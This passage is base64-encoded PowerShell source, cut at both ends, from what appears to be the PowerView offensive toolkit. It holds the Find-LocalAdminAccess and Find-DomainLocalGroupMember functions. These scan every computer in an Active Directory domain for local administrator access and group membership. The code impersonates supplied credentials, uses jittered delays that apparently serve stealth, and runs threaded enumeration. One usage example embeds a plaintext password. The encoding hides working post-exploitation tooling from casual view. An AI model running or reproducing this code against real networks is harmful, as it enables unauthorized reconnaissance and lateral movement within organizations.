CBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2l0ZU5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNpdGVOYW1lLAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRDaGVja1NoYXJlQWNjZXNzLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAoKICAgICAgICBbSW50XQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVW5jb25zdHJhaW5lZCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydVbmNvbnN0cmFpbmVkJ10gPSAkVW5jb25zdHJhaW5lZCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJPcGVyYXRpbmdTeXN0ZW0nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snT3BlcmF0aW5nU3lzdGVtJ10gPSAkT3BlcmF0aW5nU3lzdGVtIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlcnZpY2VQYWNrJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZpY2VQYWNrJ10gPSAkU2VydmljZVBhY2sgfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyU2l0ZU5hbWUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2l0ZU5hbWUnXSA9ICRTaXRlTmFtZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlciddID0gJFNlcnZlciB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VhcmNoU2NvcGUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoU2NvcGUnXSA9ICRTZWFyY2hTY29wZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snUmVzdWx0UGFnZVNpemUnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snUmVzdWx0UGFnZVNpemUnXSA9ICRSZXN1bHRQYWdlU2l6ZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snU2VydmVyVGltZUxpbWl0J10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1NlcnZlclRpbWVMaW1pdCddID0gJFNlcnZlclRpbWVMaW1pdCB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snVG9tYnN0b25lJ10pIHsgJENvbXB1dGVyU2VhcmNoZXJBcmd1bWVudHNbJ1RvbWJzdG9uZSddID0gJFRvbWJzdG9uZSB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ3JlZGVudGlhbCddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydDcmVkZW50aWFsJ10gPSAkQ3JlZGVudGlhbCB9CgogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTmFtZSddKSB7CiAgICAgICAgICAgICRUYXJnZXRDb21wdXRlcnMgPSAkQ29tcHV0ZXJOYW1lCiAgICAgICAgfQogICAgICAgIGVsc2UgewogICAgICAgICAgICBXcml0ZS1WZXJib3NlICdbRmluZC1Mb2NhbEFkbWluQWNjZXNzXSBRdWVyeWluZyBjb21wdXRlcnMgaW4gdGhlIGRvbWFpbicKICAgICAgICAgICAgJFRhcmdldENvbXB1dGVycyA9IEdldC1Eb21haW5Db21wdXRlciBAQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyB8IFNlbGVjdC1PYmplY3QgLUV4cGFuZFByb3BlcnR5IGRuc2hvc3RuYW1lCiAgICAgICAgfQogICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUxvY2FsQWRtaW5BY2Nlc3NdIFRhcmdldENvbXB1dGVycyBsZW5ndGg6ICQoJFRhcmdldENvbXB1dGVycy5MZW5ndGgpIgogICAgICAgIGlmICgkVGFyZ2V0Q29tcHV0ZXJzLkxlbmd0aCAtZXEgMCkgewogICAgICAgICAgICB0aHJvdyAnW0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gTm8gaG9zdHMgZm91bmQgdG8gZW51bWVyYXRlJwogICAgICAgIH0KCiAgICAgICAgIyB0aGUgaG9zdCBlbnVtZXJhdGlvbiBibG9jayB3ZSdyZSB1c2luZyB0byBlbnVtZXJhdGUgYWxsIHNlcnZlcnMKICAgICAgICAkSG9zdEVudW1CbG9jayA9IHsKICAgICAgICAgICAgUGFyYW0oJENvbXB1dGVyTmFtZSwgJFRva2VuSGFuZGxlKQoKICAgICAgICAgICAgaWYgKCRUb2tlbkhhbmRsZSkgewogICAgICAgICAgICAgICAgIyBpbXBlcnNvbmF0ZSB0aGUgdGhlIHRva2VuIHByb2R1Y2VkIGJ5IExvZ29uVXNlcigpL0ludm9rZS1Vc2VySW1wZXJzb25hdGlvbgogICAgICAgICAgICAgICAgJE51bGwgPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLVRva2VuSGFuZGxlICRUb2tlbkhhbmRsZSAtUXVpZXQKICAgICAgICAgICAgfQoKICAgICAgICAgICAgRm9yRWFjaCAoJFRhcmdldENvbXB1dGVyIGluICRDb21wdXRlck5hbWUpIHsKICAgICAgICAgICAgICAgICRVcCA9IFRlc3QtQ29ubmVjdGlvbiAtQ291bnQgMSAtUXVpZXQgLUNvbXB1dGVyTmFtZSAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgIGlmICgkVXApIHsKICAgICAgICAgICAgICAgICAgICAjIGNoZWNrIGlmIHRoZSBjdXJyZW50IHVzZXIgaGFzIGxvY2FsIGFkbWluIGFjY2VzcyB0byB0aGlzIHNlcnZlcgogICAgICAgICAgICAgICAgICAgICRBY2Nlc3MgPSBUZXN0LUFkbWluQWNjZXNzIC1Db21wdXRlck5hbWUgJFRhcmdldENvbXB1dGVyCiAgICAgICAgICAgICAgICAgICAgaWYgKCRBY2Nlc3MuSXNBZG1pbikgewogICAgICAgICAgICAgICAgICAgICAgICAkVGFyZ2V0Q29tcHV0ZXIKICAgICAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgICAgICB9CiAgICAgICAgICAgIH0KCiAgICAgICAgICAgIGlmICgkVG9rZW5IYW5kbGUpIHsKICAgICAgICAgICAgICAgIEludm9rZS1SZXZlcnRUb1NlbGYKICAgICAgICAgICAgfQogICAgICAgIH0KCiAgICAgICAgJExvZ29uVG9rZW4gPSAkTnVsbAogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NyZWRlbnRpYWwnXSkgewogICAgICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewogICAgICAgICAgICAgICAgJExvZ29uVG9rZW4gPSBJbnZva2UtVXNlckltcGVyc29uYXRpb24gLUNyZWRlbnRpYWwgJENyZWRlbnRpYWwKICAgICAgICAgICAgfQogICAgICAgICAgICBlbHNlIHsKICAgICAgICAgICAgICAgICRMb2dvblRva2VuID0gSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uIC1DcmVkZW50aWFsICRDcmVkZW50aWFsIC1RdWlldAogICAgICAgICAgICB9CiAgICAgICAgfQogICAgfQoKICAgIFBST0NFU1MgewogICAgICAgICMgb25seSBpZ25vcmUgdGhyZWFkaW5nIGlmIC1EZWxheSBpcyBwYXNzZWQKICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydEZWxheSddIC1vciAkUFNCb3VuZFBhcmFtZXRlcnNbJ1N0b3BPblN1Y2Nlc3MnXSkgewoKICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gVG90YWwgbnVtYmVyIG9mIGhvc3RzOiAkKCRUYXJnZXRDb21wdXRlcnMuY291bnQpIgogICAgICAgICAgICBXcml0ZS1WZXJib3NlICJbRmluZC1Mb2NhbEFkbWluQWNjZXNzXSBEZWxheTogJERlbGF5LCBKaXR0ZXI6ICRKaXR0ZXIiCiAgICAgICAgICAgICRDb3VudGVyID0gMAogICAgICAgICAgICAkUmFuZE5vID0gTmV3LU9iamVjdCBTeXN0ZW0uUmFuZG9tCgogICAgICAgICAgICBGb3JFYWNoICgkVGFyZ2V0Q29tcHV0ZXIgaW4gJFRhcmdldENvbXB1dGVycykgewogICAgICAgICAgICAgICAgJENvdW50ZXIgPSAkQ291bnRlciArIDEKCiAgICAgICAgICAgICAgICAjIHNsZWVwIGZvciBvdXIgc2VtaS1yYW5kb21pemVkIGludGVydmFsCiAgICAgICAgICAgICAgICBTdGFydC1TbGVlcCAtU2Vjb25kcyAkUmFuZE5vLk5leHQoKDEtJEppdHRlcikqJERlbGF5LCAoMSskSml0dGVyKSokRGVsYXkpCgogICAgICAgICAgICAgICAgV3JpdGUtVmVyYm9zZSAiW0ZpbmQtTG9jYWxBZG1pbkFjY2Vzc10gRW51bWVyYXRpbmcgc2VydmVyICRUYXJnZXRDb21wdXRlciAoJENvdW50ZXIgb2YgJCgkVGFyZ2V0Q29tcHV0ZXJzLmNvdW50KSkiCiAgICAgICAgICAgICAgICBJbnZva2UtQ29tbWFuZCAtU2NyaXB0QmxvY2sgJEhvc3RFbnVtQmxvY2sgLUFyZ3VtZW50TGlzdCAkVGFyZ2V0Q29tcHV0ZXIsICRMb2dvblRva2VuCiAgICAgICAgICAgIH0KICAgICAgICB9CiAgICAgICAgZWxzZSB7CiAgICAgICAgICAgIFdyaXRlLVZlcmJvc2UgIltGaW5kLUxvY2FsQWRtaW5BY2Nlc3NdIFVzaW5nIHRocmVhZGluZyB3aXRoIHRocmVhZHM6ICRUaHJlYWRzIgoKICAgICAgICAgICAgIyBpZiB3ZSdyZSB1c2luZyB0aHJlYWRpbmcsIGtpY2sgb2ZmIHRoZSBzY3JpcHQgYmxvY2sgd2l0aCBOZXctVGhyZWFkZWRGdW5jdGlvbgogICAgICAgICAgICAkU2NyaXB0UGFyYW1zID0gQHsKICAgICAgICAgICAgICAgICdUb2tlbkhhbmRsZScgPSAkTG9nb25Ub2tlbgogICAgICAgICAgICB9CgogICAgICAgICAgICAjIGlmIHdlJ3JlIHVzaW5nIHRocmVhZGluZywga2ljayBvZmYgdGhlIHNjcmlwdCBibG9jayB3aXRoIE5ldy1UaHJlYWRlZEZ1bmN0aW9uIHVzaW5nIHRoZSAkSG9zdEVudW1CbG9jayArIHBhcmFtcwogICAgICAgICAgICBOZXctVGhyZWFkZWRGdW5jdGlvbiAtQ29tcHV0ZXJOYW1lICRUYXJnZXRDb21wdXRlcnMgLVNjcmlwdEJsb2NrICRIb3N0RW51bUJsb2NrIC1TY3JpcHRQYXJhbWV0ZXJzICRTY3JpcHRQYXJhbXMgLVRocmVhZHMgJFRocmVhZHMKICAgICAgICB9CiAgICB9Cn0KCgpmdW5jdGlvbiBGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXIgewo8IwouU1lOT1BTSVMKCkVudW1lcmF0ZXMgdGhlIG1lbWJlcnMgb2Ygc3BlY2lmaWVkIGxvY2FsIGdyb3VwIChkZWZhdWx0IGFkbWluaXN0cmF0b3JzKQpmb3IgYWxsIHRoZSB0YXJnZXRlZCBtYWNoaW5lcyBvbiB0aGUgY3VycmVudCAob3Igc3BlY2lmaWVkKSBkb21haW4uCgpBdXRob3I6IFdpbGwgU2Nocm9lZGVyIChAaGFybWoweSkgIApMaWNlbnNlOiBCU0QgMy1DbGF1c2UgIApSZXF1aXJlZCBEZXBlbmRlbmNpZXM6IEdldC1Eb21haW5Db21wdXRlciwgSW52b2tlLVVzZXJJbXBlcnNvbmF0aW9uLCBJbnZva2UtUmV2ZXJ0VG9TZWxmLCBHZXQtTmV0TG9jYWxHcm91cE1lbWJlciwgTmV3LVRocmVhZGVkRnVuY3Rpb24gIAoKLkRFU0NSSVBUSU9OCgpUaGlzIGZ1bmN0aW9uIGVudW1lcmF0ZXMgYWxsIG1hY2hpbmVzIG9uIHRoZSBjdXJyZW50IChvciBzcGVjaWZpZWQpIGRvbWFpbgp1c2luZyBHZXQtRG9tYWluQ29tcHV0ZXIsIGFuZCBlbnVtZXJhdGVzIHRoZSBtZW1iZXJzIG9mIHRoZSBzcGVjaWZpZWQgbG9jYWwKZ3JvdXAgKGRlZmF1bHQgb2YgQWRtaW5pc3RyYXRvcnMpIGZvciBlYWNoIG1hY2hpbmUgdXNpbmcgR2V0LU5ldExvY2FsR3JvdXBNZW1iZXIuCkJ5IGRlZmF1bHQsIHRoZSBBUEkgbWV0aG9kIGlzIHVzZWQsIGJ1dCB0aGlzIGNhbiBiZSBtb2RpZmllZCB3aXRoICctTWV0aG9kIHdpbm50Jwp0byB1c2UgdGhlIFdpbk5UIHNlcnZpY2UgcHJvdmlkZXIuCgouUEFSQU1FVEVSIENvbXB1dGVyTmFtZQoKU3BlY2lmaWVzIGFuIGFycmF5IG9mIG9uZSBvciBtb3JlIGhvc3RzIHRvIGVudW1lcmF0ZSwgcGFzc2FibGUgb24gdGhlIHBpcGVsaW5lLgpJZiAtQ29tcHV0ZXJOYW1lIGlzIG5vdCBwYXNzZWQsIHRoZSBkZWZhdWx0IGJlaGF2aW9yIGlzIHRvIGVudW1lcmF0ZSBhbGwgbWFjaGluZXMKaW4gdGhlIGRvbWFpbiByZXR1cm5lZCBieSBHZXQtRG9tYWluQ29tcHV0ZXIuCgouUEFSQU1FVEVSIENvbXB1dGVyRG9tYWluCgpTcGVjaWZpZXMgdGhlIGRvbWFpbiB0byBxdWVyeSBmb3IgY29tcHV0ZXJzLCBkZWZhdWx0cyB0byB0aGUgY3VycmVudCBkb21haW4uCgouUEFSQU1FVEVSIENvbXB1dGVyTERBUEZpbHRlcgoKU3BlY2lmaWVzIGFuIExEQVAgcXVlcnkgc3RyaW5nIHRoYXQgaXMgdXNlZCB0byBzZWFyY2ggZm9yIGNvbXB1dGVyIG9iamVjdHMuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VhcmNoQmFzZQoKU3BlY2lmaWVzIHRoZSBMREFQIHNvdXJjZSB0byBzZWFyY2ggdGhyb3VnaCBmb3IgY29tcHV0ZXJzLAplLmcuICJMREFQOi8vT1U9c2VjcmV0LERDPXRlc3RsYWIsREM9bG9jYWwiLiBVc2VmdWwgZm9yIE9VIHF1ZXJpZXMuCgouUEFSQU1FVEVSIENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtCgpTZWFyY2ggY29tcHV0ZXJzIHdpdGggYSBzcGVjaWZpYyBvcGVyYXRpbmcgc3lzdGVtLCB3aWxkY2FyZHMgYWNjZXB0ZWQuCgouUEFSQU1FVEVSIENvbXB1dGVyU2VydmljZVBhY2sKClNlYXJjaCBjb21wdXRlcnMgd2l0aCBhIHNwZWNpZmljIHNlcnZpY2UgcGFjaywgd2lsZGNhcmRzIGFjY2VwdGVkLgoKLlBBUkFNRVRFUiBDb21wdXRlclNpdGVOYW1lCgpTZWFyY2ggY29tcHV0ZXJzIGluIHRoZSBzcGVjaWZpYyBBRCBTaXRlIG5hbWUsIHdpbGRjYXJkcyBhY2NlcHRlZC4KCi5QQVJBTUVURVIgR3JvdXBOYW1lCgpUaGUgbG9jYWwgZ3JvdXAgbmFtZSB0byBxdWVyeSBmb3IgdXNlcnMuIElmIG5vdCBnaXZlbiwgaXQgZGVmYXVsdHMgdG8gIkFkbWluaXN0cmF0b3JzIi4KCi5QQVJBTUVURVIgTWV0aG9kCgpUaGUgY29sbGVjdGlvbiBtZXRob2QgdG8gdXNlLCBkZWZhdWx0cyB0byAnQVBJJywgYWxzbyBhY2NlcHRzICdXaW5OVCcuCgouUEFSQU1FVEVSIFNlcnZlcgoKU3BlY2lmaWVzIGFuIEFjdGl2ZSBEaXJlY3Rvcnkgc2VydmVyIChkb21haW4gY29udHJvbGxlcikgdG8gYmluZCB0by4KCi5QQVJBTUVURVIgU2VhcmNoU2NvcGUKClNwZWNpZmllcyB0aGUgc2NvcGUgdG8gc2VhcmNoIHVuZGVyIGZvciBjb21wdXRlcnMsIEJhc2UvT25lTGV2ZWwvU3VidHJlZSAoZGVmYXVsdCBvZiBTdWJ0cmVlKS4KCi5QQVJBTUVURVIgUmVzdWx0UGFnZVNpemUKClNwZWNpZmllcyB0aGUgUGFnZVNpemUgdG8gc2V0IGZvciB0aGUgTERBUCBzZWFyY2hlciBvYmplY3QuCgouUEFSQU1FVEVSIFNlcnZlclRpbWVMaW1pdAoKU3BlY2lmaWVzIHRoZSBtYXhpbXVtIGFtb3VudCBvZiB0aW1lIHRoZSBzZXJ2ZXIgc3BlbmRzIHNlYXJjaGluZy4gRGVmYXVsdCBvZiAxMjAgc2Vjb25kcy4KCi5QQVJBTUVURVIgVG9tYnN0b25lCgpTd2l0Y2guIFNwZWNpZmllcyB0aGF0IHRoZSBzZWFyY2hlciBzaG91bGQgYWxzbyByZXR1cm4gZGVsZXRlZC90b21ic3RvbmVkIG9iamVjdHMuCgouUEFSQU1FVEVSIENyZWRlbnRpYWwKCkEgW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdIG9iamVjdCBvZiBhbHRlcm5hdGUgY3JlZGVudGlhbHMKZm9yIGNvbm5lY3Rpb24gdG8gdGhlIHRhcmdldCBkb21haW4gYW5kIHRhcmdldCBzeXN0ZW1zLgoKLlBBUkFNRVRFUiBEZWxheQoKU3BlY2lmaWVzIHRoZSBkZWxheSAoaW4gc2Vjb25kcykgYmV0d2VlbiBlbnVtZXJhdGluZyBob3N0cywgZGVmYXVsdHMgdG8gMC4KCi5QQVJBTUVURVIgSml0dGVyCgpTcGVjaWZpZXMgdGhlIGppdHRlciAoMC0xLjApIHRvIGFwcGx5IHRvIGFueSBzcGVjaWZpZWQgLURlbGF5LCBkZWZhdWx0cyB0byArLy0gMC4zCgouUEFSQU1FVEVSIFRocmVhZHMKClRoZSBudW1iZXIgb2YgdGhyZWFkcyB0byB1c2UgZm9yIHVzZXIgc2VhcmNoaW5nLCBkZWZhdWx0cyB0byAyMC4KCi5FWEFNUExFCgpGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXIKCkVudW1lcmF0ZXMgdGhlIGxvY2FsIGdyb3VwIG1lbWJlcnNoaXBzIGZvciBhbGwgcmVhY2hhYmxlIG1hY2hpbmVzIGluIHRoZSBjdXJyZW50IGRvbWFpbi4KCi5FWEFNUExFCgpGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXIgLURvbWFpbiBkZXYudGVzdGxhYi5sb2NhbAoKRW51bWVyYXRlcyB0aGUgbG9jYWwgZ3JvdXAgbWVtYmVyc2hpcHMgZm9yIGFsbCByZWFjaGFibGUgbWFjaGluZXMgdGhlIGRldi50ZXN0bGFiLmxvY2FsIGRvbWFpbi4KCi5FWEFNUExFCgokU2VjUGFzc3dvcmQgPSBDb252ZXJ0VG8tU2VjdXJlU3RyaW5nICdQYXNzd29yZDEyMyEnIC1Bc1BsYWluVGV4dCAtRm9yY2UKJENyZWQgPSBOZXctT2JqZWN0IFN5c3RlbS5NYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsKCdURVNUTEFCXGRmbS5hJywgJFNlY1Bhc3N3b3JkKQpGaW5kLURvbWFpbkxvY2FsR3JvdXBNZW1iZXIgLURvbWFpbiB0ZXN0bGFiLmxvY2FsIC1DcmVkZW50aWFsICRDcmVkCgpFbnVtZXJhdGVzIHRoZSBsb2NhbCBncm91cCBtZW1iZXJzaGlwcyBmb3IgYWxsIHJlYWNoYWJsZSBtYWNoaW5lcyB0aGUgZGV2LnRlc3RsYWIubG9jYWwKZG9tYWluIHVzaW5nIHRoZSBhbHRlcm5hdGUgY3JlZGVudGlhbHMuCgouT1VUUFVUUwoKUG93ZXJWaWV3LkxvY2FsR3JvdXBNZW1iZXIuQVBJCgpDdXN0b20gUFNPYmplY3Qgd2l0aCB0cmFuc2xhdGVkIGdyb3VwIHByb3BlcnR5IGZpZWxkcyBmcm9tIEFQSSByZXN1bHRzLgoKUG93ZXJWaWV3LkxvY2FsR3JvdXBNZW1iZXIuV2luTlQKCkN1c3RvbSBQU09iamVjdCB3aXRoIHRyYW5zbGF0ZWQgZ3JvdXAgcHJvcGVydHkgZmllbGRzIGZyb20gV2luTlQgcmVzdWx0cy4KIz4KCiAgICBbRGlhZ25vc3RpY3MuQ29kZUFuYWx5c2lzLlN1cHByZXNzTWVzc2FnZUF0dHJpYnV0ZSgnUFNTaG91bGRQcm9jZXNzJywgJycpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLkFQSScpXQogICAgW091dHB1dFR5cGUoJ1Bvd2VyVmlldy5Mb2NhbEdyb3VwTWVtYmVyLldpbk5UJyldCiAgICBQYXJhbSgKICAgICAgICBbUGFyYW1ldGVyKFBvc2l0aW9uID0gMCwgVmFsdWVGcm9tUGlwZWxpbmUgPSAkVHJ1ZSwgVmFsdWVGcm9tUGlwZWxpbmVCeVByb3BlcnR5TmFtZSA9ICRUcnVlKV0KICAgICAgICBbQWxpYXMoJ0ROU0hvc3ROYW1lJyldCiAgICAgICAgW1N0cmluZ1tdXQogICAgICAgICRDb21wdXRlck5hbWUsCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJEb21haW4sCgogICAgICAgIFtWYWxpZGF0ZU5vdE51bGxPckVtcHR5KCldCiAgICAgICAgW1N0cmluZ10KICAgICAgICAkQ29tcHV0ZXJMREFQRmlsdGVyLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyU2VhcmNoQmFzZSwKCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbQWxpYXMoJ09wZXJhdGluZ1N5c3RlbScpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJENvbXB1dGVyT3BlcmF0aW5nU3lzdGVtLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2VydmljZVBhY2snKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNlcnZpY2VQYWNrLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnU2l0ZU5hbWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRDb21wdXRlclNpdGVOYW1lLAoKICAgICAgICBbUGFyYW1ldGVyKFZhbHVlRnJvbVBpcGVsaW5lQnlQcm9wZXJ0eU5hbWUgPSAkVHJ1ZSldCiAgICAgICAgW1ZhbGlkYXRlTm90TnVsbE9yRW1wdHkoKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRHcm91cE5hbWUgPSAnQWRtaW5pc3RyYXRvcnMnLAoKICAgICAgICBbVmFsaWRhdGVTZXQoJ0FQSScsICdXaW5OVCcpXQogICAgICAgIFtBbGlhcygnQ29sbGVjdGlvbk1ldGhvZCcpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJE1ldGhvZCA9ICdBUEknLAoKICAgICAgICBbVmFsaWRhdGVOb3ROdWxsT3JFbXB0eSgpXQogICAgICAgIFtBbGlhcygnRG9tYWluQ29udHJvbGxlcicpXQogICAgICAgIFtTdHJpbmddCiAgICAgICAgJFNlcnZlciwKCiAgICAgICAgW1ZhbGlkYXRlU2V0KCdCYXNlJywgJ09uZUxldmVsJywgJ1N1YnRyZWUnKV0KICAgICAgICBbU3RyaW5nXQogICAgICAgICRTZWFyY2hTY29wZSA9ICdTdWJ0cmVlJywKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJFJlc3VsdFBhZ2VTaXplID0gMjAwLAoKICAgICAgICBbVmFsaWRhdGVSYW5nZSgxLCAxMDAwMCldCiAgICAgICAgW0ludF0KICAgICAgICAkU2VydmVyVGltZUxpbWl0LAoKICAgICAgICBbU3dpdGNoXQogICAgICAgICRUb21ic3RvbmUsCgogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uUFNDcmVkZW50aWFsXQogICAgICAgIFtNYW5hZ2VtZW50LkF1dG9tYXRpb24uQ3JlZGVudGlhbEF0dHJpYnV0ZSgpXQogICAgICAgICRDcmVkZW50aWFsID0gW01hbmFnZW1lbnQuQXV0b21hdGlvbi5QU0NyZWRlbnRpYWxdOjpFbXB0eSwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMSwgMTAwMDApXQogICAgICAgIFtJbnRdCiAgICAgICAgJERlbGF5ID0gMCwKCiAgICAgICAgW1ZhbGlkYXRlUmFuZ2UoMC4wLCAxLjApXQogICAgICAgIFtEb3VibGVdCiAgICAgICAgJEppdHRlciA9IC4zLAoKICAgICAgICBbSW50XQogICAgICAgIFtWYWxpZGF0ZVJhbmdlKDEsIDEwMCldCiAgICAgICAgJFRocmVhZHMgPSAyMAogICAgKQoKICAgIEJFR0lOIHsKICAgICAgICAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50cyA9IEB7CiAgICAgICAgICAgICdQcm9wZXJ0aWVzJyA9ICdkbnNob3N0bmFtZScKICAgICAgICB9CiAgICAgICAgaWYgKCRQU0JvdW5kUGFyYW1ldGVyc1snQ29tcHV0ZXJEb21haW4nXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snRG9tYWluJ10gPSAkQ29tcHV0ZXJEb21haW4gfQogICAgICAgIGlmICgkUFNCb3VuZFBhcmFtZXRlcnNbJ0NvbXB1dGVyTERBUEZpbHRlciddKSB7ICRDb21wdXRlclNlYXJjaGVyQXJndW1lbnRzWydMREFQRmlsdGVyJ10gPSAkQ29tcHV0ZXJMREFQRmlsdGVyIH0KICAgICAgICBpZiAoJFBTQm91bmRQYXJhbWV0ZXJzWydDb21wdXRlclNlYXJjaEJhc2UnXSkgeyAkQ29tcHV0ZXJTZWFyY2hlckFyZ3VtZW50c1snU2VhcmNoQmFzZSddID0gJENvbXB1dGVyU2VhcmNoQmFzZSB9CiAgICAgICAgaWYgKCRQU0J